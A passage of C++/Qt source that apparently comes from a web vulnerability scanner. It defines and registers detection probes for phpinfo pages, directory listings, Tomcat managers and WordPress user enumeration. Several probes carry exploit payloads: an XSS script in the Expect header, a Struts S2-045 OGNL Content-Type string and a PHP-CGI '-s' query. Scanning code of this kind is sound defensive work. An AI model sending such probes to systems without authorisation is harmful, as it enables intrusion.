            QNetworkRequest req(response()->url);
            req.setRawHeader("Authorization", "Basic " + c.toUtf8().toBase64());
            req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
            networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
        }
    }
};

// Form Brute Force Test
class FormBruteForceTest final : public TestScriptBase {
public:
    explicit FormBruteForceTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("formbruteforce"); }
    quint64 scriptId() const override { return 0x101E; }
    void execute() override { }
};

// Password Form Test
class PasswordFormTest final : public TestScriptBase {
public:
    explicit PasswordFormTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("passwordform"); }
    quint64 scriptId() const override { return 0x101F; }
    void execute() override {
        if (event().type != 8 || !response()) return;
        const QString content = QString::fromUtf8(response()->raw.mid(response()->bodyOffset, response()->bodyLength));
        if (content.contains(QStringLiteral("type=\"password\"")) || content.contains(QStringLiteral("type='password'")))
            reportIssue(QStringLiteral("Password Form Detected"), QStringLiteral("passwordform@") + response()->url.path());
    }
};

// PHP Info Test
class PhpInfoTest final : public TestScriptBase {
public:
    explicit PhpInfoTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("phpinfo"); }
    quint64 scriptId() const override { return 0x1020; }
    void execute() override {
        if (event().type != 8 || !response() || !networkContext()) return;
        static QSet<QString> tested;
        if (tested.contains(response()->url.host())) return;
        tested.insert(response()->url.host());
        for (const QString &p : {"/phpinfo.php", "/info.php", "/test.php", "/i.php"}) {
            QUrl url = response()->url; url.setPath(p);
            QNetworkRequest req(url);
            req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
            networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
        }
    }
};

// HTTP Verb Test
class HttpVerbTest final : public TestScriptBase {
public:
    explicit HttpVerbTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("httpverb"); }
    quint64 scriptId() const override { return 0x1021; }
    void execute() override {
        if (event().type != 8 || !response() || !networkContext()) return;
        for (const QByteArray &m : {"OPTIONS", "TRACE", "PUT", "DELETE"}) {
            QNetworkRequest req(response()->url);
            req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
            networkContext()->manager->submit(req, m, QByteArray(), 4 | 1, QVariant(), 0, 0);
        }
    }
};

// Directory Listing Test
class DirListingTest final : public TestScriptBase {
public:
    explicit DirListingTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("dirlisting"); }
    quint64 scriptId() const override { return 0x1022; }
    void execute() override {
        if (event().type != 8 || !response()) return;
        const QString c = QString::fromUtf8(response()->raw.mid(response()->bodyOffset, response()->bodyLength));
        if (c.contains(QStringLiteral("Index of /")) || c.contains(QStringLiteral("Directory listing")) ||
            c.contains(QStringLiteral("<title>Index of")))
            reportIssue(QStringLiteral("Directory Listing Enabled"), QStringLiteral("dirlisting@") + response()->url.path());
    }
};

// Outdated Web Server Test
class OutdatedWebServerTest final : public TestScriptBase {
public:
    explicit OutdatedWebServerTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("outdatedwebserver"); }
    quint64 scriptId() const override { return 0x1023; }
    void execute() override { }
};

// Outdated PHP Test
class OutdatedPhpTest final : public TestScriptBase {
public:
    explicit OutdatedPhpTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("outdatedphp"); }
    quint64 scriptId() const override { return 0x1024; }
    void execute() override { }
};

// Outdated WordPress Test
class OutdatedWordPressTest final : public TestScriptBase {
public:
    explicit OutdatedWordPressTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("outdatedwordpress"); }
    quint64 scriptId() const override { return 0x1025; }
    void execute() override { }
};

// HTTPS Detection Test
class HttpsDetectionTest final : public TestScriptBase {
public:
    explicit HttpsDetectionTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("httpsdetection"); }
    quint64 scriptId() const override { return 0x1026; }
    void execute() override { }
};

// HTTPS Test
class HttpsTest final : public TestScriptBase {
public:
    explicit HttpsTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("https"); }
    quint64 scriptId() const override { return 0x1027; }
    void execute() override { }
};

// HTTPS Redirection Test
class HttpsRedirectionTest final : public TestScriptBase {
public:
    explicit HttpsRedirectionTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("httpsredirection"); }
    quint64 scriptId() const override { return 0x1028; }
    void execute() override { }
};

// React2Shell Test
class React2ShellTest final : public TestScriptBase {
public:
    explicit React2ShellTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("react2shell"); }
    quint64 scriptId() const override { return 0x1029; }
    void execute() override { }
};

// Web Server Penetration Test
class WebServerPtTest final : public TestScriptBase {
public:
    explicit WebServerPtTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("webserverpt"); }
    quint64 scriptId() const override { return 0x102A; }
    void execute() override { }
};

// Apache Server Status Test
class ApacheServerStatusTest final : public TestScriptBase {
public:
    explicit ApacheServerStatusTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("apacheserverstatus"); }
    quint64 scriptId() const override { return 0x102B; }
    void execute() override {
        if (event().type != 8 || !response() || !networkContext()) return;
        static QSet<QString> tested;
        if (tested.contains(response()->url.host())) return;
        tested.insert(response()->url.host());
        QUrl url = response()->url; url.setPath(QStringLiteral("/server-status"));
        QNetworkRequest req(url);
        req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
        networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
    }
};

// Apache Expect Header XSS
class ApacheExpectXssTest final : public TestScriptBase {
public:
    explicit ApacheExpectXssTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("apacheexpectheaderxss"); }
    quint64 scriptId() const override { return 0x102C; }
    void execute() override {
        if (event().type != 8 || !response() || !networkContext()) return;
        QNetworkRequest req(response()->url);
        req.setRawHeader("Expect", "<script>alert(1)</script>");
        req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
        networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
    }
};

// Apache Struts RCE Tests
class ApacheStrutsRceTest final : public TestScriptBase {
public:
    explicit ApacheStrutsRceTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("apachestruts2rces2045"); }
    quint64 scriptId() const override { return 0x102D; }
    void execute() override {
        if (event().type != 8 || !response() || !networkContext()) return;
        QNetworkRequest req(response()->url);
        req.setRawHeader("Content-Type", "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}");
        req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
        networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
    }
};

// Apache Struts REST Plugin XStream RCE
class ApacheStrutsRestTest final : public TestScriptBase {
public:
    explicit ApacheStrutsRestTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("apachestruts2restpluginxstreamrc"); }
    quint64 scriptId() const override { return 0x102E; }
    void execute() override { }
};

// Apache Struts OGNL Expression RCE
class ApacheStrutsOgnlTest final : public TestScriptBase {
public:
    explicit ApacheStrutsOgnlTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("apachestrutsognlexpressionrces20"); }
    quint64 scriptId() const override { return 0x102F; }
    void execute() override { }
};

// Apache Tomcat Manager Tests
class ApacheTomcatManagerTest final : public TestScriptBase {
public:
    explicit ApacheTomcatManagerTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("apachetomcatmanagertests"); }
    quint64 scriptId() const override { return 0x1030; }
    void execute() override {
        if (event().type != 8 || !response() || !networkContext()) return;
        static QSet<QString> tested;
        if (tested.contains(response()->url.host())) return;
        tested.insert(response()->url.host());
        for (const QString &p : {"/manager/html", "/manager/status", "/host-manager/html"}) {
            QUrl url = response()->url; url.setPath(p);
            QNetworkRequest req(url);
            req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
            networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
        }
    }
};

// Apache Tomcat JSP Upload RCE
class ApacheTomcatJspRceTest final : public TestScriptBase {
public:
    explicit ApacheTomcatJspRceTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("apachetomcatjspuploadrce"); }
    quint64 scriptId() const override { return 0x1031; }
    void execute() override { }
};

// Apache CVE Tests
class Apache2449Test final : public TestScriptBase {
public:
    explicit Apache2449Test(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("apache2449ptandrce"); }
    quint64 scriptId() const override { return 0x1032; }
    void execute() override { }
};

class ApacheModProxyTest final : public TestScriptBase {
public:
    explicit ApacheModProxyTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("apachemodproxy2448ssrf"); }
    quint64 scriptId() const override { return 0x1033; }
    void execute() override { }
};

// Nginx Tests
class NginxNullByteTest final : public TestScriptBase {
public:
    explicit NginxNullByteTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("nginxnullbyte"); }
    quint64 scriptId() const override { return 0x1034; }
    void execute() override { }
};

class NginxSpaceBypassTest final : public TestScriptBase {
public:
    explicit NginxSpaceBypassTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("nginxspacebypass"); }
    quint64 scriptId() const override { return 0x1035; }
    void execute() override { }
};

class NginxIntOverflowTest final : public TestScriptBase {
public:
    explicit NginxIntOverflowTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("nginxintoverflow"); }
    quint64 scriptId() const override { return 0x1036; }
    void execute() override { }
};

// IIS Tests
class IisTildeDirEnumTest final : public TestScriptBase {
public:
    explicit IisTildeDirEnumTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("iistildedirenum"); }
    quint64 scriptId() const override { return 0x1037; }
    void execute() override {
        if (event().type != 8 || !response() || !networkContext()) return;
        static QSet<QString> tested;
        if (tested.contains(response()->url.host())) return;
        tested.insert(response()->url.host());
        QUrl url = response()->url; url.setPath(QStringLiteral("/~1/.aspx"));
        QNetworkRequest req(url);
        req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
        networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
    }
};

// PHP CGI RCE
class PhpCgiRceTest final : public TestScriptBase {
public:
    explicit PhpCgiRceTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("phpcgirce"); }
    quint64 scriptId() const override { return 0x1038; }
    void execute() override {
        if (event().type != 8 || !response() || !networkContext()) return;
        QUrl url = response()->url;
        url.setQuery(QStringLiteral("-s"));
        QNetworkRequest req(url);
        req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
        networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
    }
};

// WP Login Page Test
class WpLoginPageTest final : public TestScriptBase {
public:
    explicit WpLoginPageTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("wploginpage"); }
    quint64 scriptId() const override { return 0x1039; }
    void execute() override {
        if (event().type != 8 || !response() || !networkContext()) return;
        static QSet<QString> tested;
        if (tested.contains(response()->url.host())) return;
        tested.insert(response()->url.host());
        QUrl url = response()->url; url.setPath(QStringLiteral("/wp-login.php"));
        QNetworkRequest req(url);
        req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
        networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
    }
};

// WP User Enum Test
class WpUserEnumTest final : public TestScriptBase {
public:
    explicit WpUserEnumTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("wpuserenum"); }
    quint64 scriptId() const override { return 0x103A; }
    void execute() override {
        if (event().type != 8 || !response() || !networkContext()) return;
        static QSet<QString> tested;
        if (tested.contains(response()->url.host())) return;
        tested.insert(response()->url.host());
        QUrl url = response()->url; url.setPath(QStringLiteral("/wp-json/wp/v2/users"));
        QNetworkRequest req(url);
        req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
        networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
    }
};

} // namespace

static NullBinder s_nullBinder;

ScriptCatalog::ScriptCatalog()
    : m_factory(s_nullBinder)
{
    registerBuiltinTests();
}

void ScriptCatalog::registerBuiltinTests()
{
    // Active tests - trigger on parameter events (16/64) and analyze responses (4)
    m_factory.registerEntry({QStringLiteral("sqli"), {4, 16, 64}, 10,
        [](const QString &o) { return QSharedPointer<SqliErrorTest>::create(o); }});

    m_factory.registerEntry({QStringLiteral("xss"), {4, 16, 64}, 10,
        [](const QString &o) { return QSharedPointer<XssTest>::create(o); }});

    m_factory.registerEntry({QStringLiteral("xxe"), {4, 16, 64}, 10,
        [](const QString &o) { return QSharedPointer<XxeTest>::create(o); }});

    m_factory.registerEntry({QStringLiteral("rfi"), {4, 16, 64}, 10,
        [](const QString &o) { return QSharedPointer<RfiTest>::create(o); }});

    m_factory.registerEntry({QStringLiteral("osexec"), {4, 16, 64}, 10,
        [](const QString &o) { return QSharedPointer<OsExecTest>::create(o); }});

    m_factory.registerEntry({QStringLiteral("deserialization"), {4, 16, 64}, 10,
        [](const QString &o) { return QSharedPointer<DeserializationTest>::create(o); }});

    m_factory.registerEntry({QStringLiteral("idor"), {4, 16, 64}, 10,
        [](const QString &o) { return QSharedPointer<IdorTest>::create(o); }});

    // Tests that trigger on passive response events (8) and send active probes (4)
    m_factory.registerEntry({QStringLiteral("shellshock"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<ShellShockTest>::create(o); }});

    m_factory.registerEntry({QStringLiteral("hostheaderinjection"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<HostHeaderInjectionTest>::create(o); }});

    // Passive tests - only analyze responses (event 8)
    m_factory.registerEntry({QStringLiteral("errordetection"), {8}, 10,
        [](const QString &o) { return QSharedPointer<ErrorDetectionTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("httpheaders"), {8}, 10,
        [](const QString &o) { return QSharedPointer<HttpHeadersTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("backup"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<BackupTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("hidden"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<HiddenTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("sitemap"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<SitemapTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("robotstxt"), {8}, 10,
        [](const QString &o) { return QSharedPointer<RobotstxtTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("fingerprint"), {8}, 10,
        [](const QString &o) { return QSharedPointer<FingerprintTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("secretleak"), {8}, 10,
        [](const QString &o) { return QSharedPointer<SecretLeakTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("parser"), {8}, 10,
        [](const QString &o) { return QSharedPointer<ParserTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("passive"), {8}, 10,
        [](const QString &o) { return QSharedPointer<PassiveTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("fuzzer"), {4, 16, 64}, 10,
        [](const QString &o) { return QSharedPointer<FuzzerTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("eli"), {4, 16, 64}, 10,
        [](const QString &o) { return QSharedPointer<EliTest>::create(o); }});

    // Additional active/passive tests
    m_factory.registerEntry({QStringLiteral("xssinhttp"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<XssInHttpTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("xssinuri"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<XssInUriTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("vulnerablejslib"), {8}, 10,
        [](const QString &o) { return QSharedPointer<VulnerableJsLibTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("unicode"), {4, 16, 64}, 10,
        [](const QString &o) { return QSharedPointer<UnicodeTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("crlfinurl"), {4, 16, 64}, 10,
        [](const QString &o) { return QSharedPointer<CrlfTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("redirection"), {4, 16, 64}, 10,
        [](const QString &o) { return QSharedPointer<RedirectTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("redirectioninurl"), {8}, 10,
        [](const QString &o) { return QSharedPointer<RedirectInUrlTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("basicauthtest"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<BasicAuthTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("formbruteforce"), {8}, 10,
        [](const QString &o) { return QSharedPointer<FormBruteForceTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("passwordform"), {8}, 10,
        [](const QString &o) { return QSharedPointer<PasswordFormTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("phpinfo"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<PhpInfoTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("httpverb"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<HttpVerbTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("dirlisting"), {8}, 10,
        [](const QString &o) { return QSharedPointer<DirListingTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("outdatedwebserver"), {8}, 10,
        [](const QString &o) { return QSharedPointer<OutdatedWebServerTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("outdatedphp"), {8}, 10,
        [](const QString &o) { return QSharedPointer<OutdatedPhpTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("outdatedwordpress"), {8}, 10,
        [](const QString &o) { return QSharedPointer<OutdatedWordPressTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("httpsdetection"), {8}, 10,
        [](const QString &o) { return QSharedPointer<HttpsDetectionTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("https"), {8}, 10,
        [](const QString &o) { return QSharedPointer<HttpsTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("httpsredirection"), {8}, 10,
        [](const QString &o) { return QSharedPointer<HttpsRedirectionTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("react2shell"), {8}, 10,
        [](const QString &o) { return QSharedPointer<React2ShellTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("webserverpt"), {8}, 10,
        [](const QString &o) { return QSharedPointer<WebServerPtTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("apacheserverstatus"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<ApacheServerStatusTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("apacheexpectheaderxss"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<ApacheExpectXssTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("apachestruts2rces2045"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<ApacheStrutsRceTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("apachestruts2restpluginxstreamrc"), {8}, 10,
        [](const QString &o) { return QSharedPointer<ApacheStrutsRestTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("apachestrutsognlexpressionrces20"), {8}, 10,
        [](const QString &o) { return QSharedPointer<ApacheStrutsOgnlTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("apachetomcatmanagertests"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<ApacheTomcatManagerTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("apachetomcatjspuploadrce"), {8}, 10,
        [](const QString &o) { return QSharedPointer<ApacheTomcatJspRceTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("apache2449ptandrce"), {8}, 10,
        [](const QString &o) { return QSharedPointer<Apache2449Test>::create(o); }});
    m_factory.registerEntry({QStringLiteral("apachemodproxy2448ssrf"), {8}, 10,
        [](const QString &o) { return QSharedPointer<ApacheModProxyTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("nginxnullbyte"), {8}, 10,
        [](const QString &o) { return QSharedPointer<NginxNullByteTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("nginxspacebypass"), {8}, 10,
        [](const QString &o) { return QSharedPointer<NginxSpaceBypassTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("nginxintoverflow"), {8}, 10,
        [](const QString &o) { return QSharedPointer<NginxIntOverflowTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("iistildedirenum"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<IisTildeDirEnumTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("phpcgirce"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<PhpCgiRceTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("wploginpage"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<WpLoginPageTest>::create(o); }});
    m_factory.registerEntry({QStringLiteral("wpuserenum"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<WpUserEnumTest>::create(o); }});

    // CMS vulnerability tests (WordPress, Joomla, Drupal)
    registerWordPressTests(m_factory);
    registerJoomlaTests(m_factory);
    registerDrupalTests(m_factory);
}

ScriptURI ScriptCatalog::resolve(ScriptURI descriptor)
{
    return m_factory.resolve(std::move(descriptor));
}

QSharedPointer<NativeScriptInstancePort> ScriptCatalog::create(const ScriptURI &descriptor)
{
    auto instance = m_factory.create(descriptor);
    if (instance && m_networkManager) {
        if (auto *testScript = dynamic_cast<TestScriptBase*>(instance.data())) {
            testScript->bindNetworkManager(m_networkManager);
            if (m_issueDb)
                testScript->bindIssueDb(m_issueDb);
        }
    }
    return instance;
}

void ScriptCatalog::setNetworkManager(const QSharedPointer<NetworkManager> &manager)
{
    m_networkManager = manager;
}

void ScriptCatalog::setIssueDb(IssueDb *db)
{
    m_issueDb = db;
}
